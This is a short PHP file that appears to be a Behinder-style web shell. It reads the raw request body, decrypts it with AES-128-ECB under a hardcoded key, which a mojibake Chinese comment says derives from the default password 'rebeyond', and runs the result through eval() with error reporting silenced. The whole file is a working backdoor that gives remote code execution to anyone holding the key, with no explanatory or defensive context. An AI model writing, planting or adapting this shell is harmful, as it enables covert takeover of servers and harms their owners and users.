<?php
@error_reporting(0);
		function decrypt($data)
	{
		$key="e45e329feb5d925b"; //����ԿΪ��������32λmd5ֵ��ǰ16λ��Ĭ����������rebeyond
		return openssl_decrypt(base64_decode($data), "AES-128-ECB", $key,OPENSSL_PKCS1_PADDING);
	}
	$post=Decrypt(file_get_contents("php://input"));
    eval($post);
?>